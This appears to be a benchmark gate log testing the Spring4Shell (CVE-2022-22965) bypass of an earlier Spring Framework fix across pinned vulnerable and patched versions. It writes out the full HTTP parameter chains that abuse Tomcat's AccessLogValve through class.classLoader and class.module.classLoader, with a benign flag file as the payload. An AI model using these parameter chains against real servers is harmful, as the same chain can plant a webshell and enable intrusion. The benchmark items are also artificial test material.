PatchClosure-Bench gate log for spring-framework-cve-2022-22965 (Spring4Shell)
==============================================================================
Date: 2026-07-14
Gate variant: A (same-sink, validate_case 3-check)

CASE SUMMARY
  CVE-2010-1622 (original, incomplete fix) -> CVE-2022-22965 (bypass = Spring4Shell)
  Product: Spring Framework (spring-beans / CachedIntrospectionResults data binding)
  Root cause: CWE-915 (mass-assignment via Object property traversal)
  Mechanism: HTTP parameter data binding traverses Object.getClass().getClassLoader()
             and nested properties. The CVE-2010-1622 fix blocklisted
             class.classLoader but JDK9+ added Class.getModule() creating
             a new path: class.module.classLoader (bypasses the 2010 blocklist).

VERSIONS
  V0 = Spring 3.0.2.RELEASE on JDK 1.8.0_342 / Tomcat 8.5.77 (pre-CVE-2010-1622 blocklist)
  V1 = Spring 5.3.17         on JDK 17.0.19   / Tomcat 9.0.60 (CVE-2010-1622 blocklist, TARGET)
  V2 = Spring 5.3.18         on JDK 17.0.19   / Tomcat 9.0.60 (CVE-2022-22965 fix)

PROPERTY-FILTER EVOLUTION (CachedIntrospectionResults)
  V0 (3.0.2.RELEASE): No property-descriptor filter for classLoader.
    All Object.getClass() descendants are bindable, including
    class.classLoader.*.
  V1 (5.3.17): CVE-2010-1622 blocklist in CachedIntrospectionResults filters
    "classLoader" property when the declaring class is java.lang.Class.
    Blocks: class.classLoader.* paths.
    Misses: class.module.classLoader.* (java.lang.Module added in JDK9).
  V2 (5.3.18): CVE-2022-22965 fix adds stricter type filtering in
    CachedIntrospectionResults. Additionally blocks: class.module.*,
    restricts Class-type property descriptors broadly. Specifically:
    "if Class.class is assignable from the bean class, skip
    classLoader/protectionDomain and ALL properties of java.lang.Module."

EXPLOIT MECHANISM (benign marker, NOT webshell)
  Original (CVE-2010-1622 path):
    class.classLoader.resources.context.parent.pipeline.first.pattern=<FLAG>
    class.classLoader.resources.context.parent.pipeline.first.suffix=.txt
    class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
    class.classLoader.resources.context.parent.pipeline.first.prefix=pcb_original
    class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
    -> Reconfigures Tomcat's AccessLogValve to write a benign text file
       containing the FLAG token into the webapp's served directory.

  Bypass (CVE-2022-22965 / Spring4Shell path):
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=<FLAG>
    class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt
    class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
    class.module.classLoader.resources.context.parent.pipeline.first.prefix=pcb_bypass
    class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
    -> Same AccessLogValve reconfiguration but via class.module.classLoader
       (JDK9+ Module hop) which bypasses the CVE-2010-1622 blocklist.

GATE RESULTS
  Flag: PCBFLAG_c859125f571d24453d8a49618a0a266c (per-run random token)
  {
    "original_poc_reaches_flag_on_v0": true,
    "original_poc_blocked_on_v1": true,
    "bypass_poc_reaches_flag_on_v1": true,
    "passed": true
  }

  Additional V2 verification:
    bypass_blocked_on_v2: true (Spring 5.3.18 blocks class.module.classLoader)

DETAIL
  1. Original on V0 (Spring 3.0.2 + Tomcat 8.5.77 + JDK8):
     - Binding request: HTTP 200 (no blocklist -> binding succeeded)
     - Marker file /pcb_original.txt: HTTP 200, body contains FLAG
     - RESULT: REACHES FLAG

  2. Original on V1 (Spring 5.3.17 + Tomcat 9.0.60 + JDK17):
     - Binding request: HTTP 200 (binding silently skips blocked property)
     - Marker file /pcb_original.txt: HTTP 404 (not created)
     - RESULT: BLOCKED (CVE-2010-1622 blocklist filters class.classLoader)

  3. Bypass on V1 (Spring 5.3.17 + Tomcat 9.0.60 + JDK17):
     - Binding request: HTTP 200 (class.module.classLoader NOT in blocklist)
     - Marker file /pcb_bypass.txt: HTTP 200, body contains FLAG
     - RESULT: REACHES FLAG (bypass via JDK9+ Module hop)

  4. Bypass on V2 (Spring 5.3.18 + Tomcat 9.0.60 + JDK17):
     - Binding request: HTTP 200 (binding silently skips blocked property)
     - Marker file /pcb_bypass.txt: HTTP 404 (not created)
     - RESULT: BLOCKED (CVE-2022-22965 fix blocks class.module.*)

NOTES
  - Tomcat version matters: Tomcat 9.0.62+ / 8.5.78+ added their own
    CVE-2022-22965 mitigation (nulled getResources() on ClassLoader).
    This benchmark pins pre-mitigation Tomcat versions (9.0.60 / 8.5.77)
    to isolate the differential to the Spring Framework fix only.
  - V0 (Spring 3.0.2) requires JDK8 and Tomcat 8.5.x (incompatible with JDK17).
    Different base images are used for V0 vs V1/V2.
  - WAR packaging on Tomcat is required (the AccessLogValve pipeline path
    only exists for WAR-deployed apps on embedded/standalone Tomcat).
  - The marker file is a plain text file containing only the FLAG token.
    No JSP, no code execution, no webshell. Purely a guard differential test.

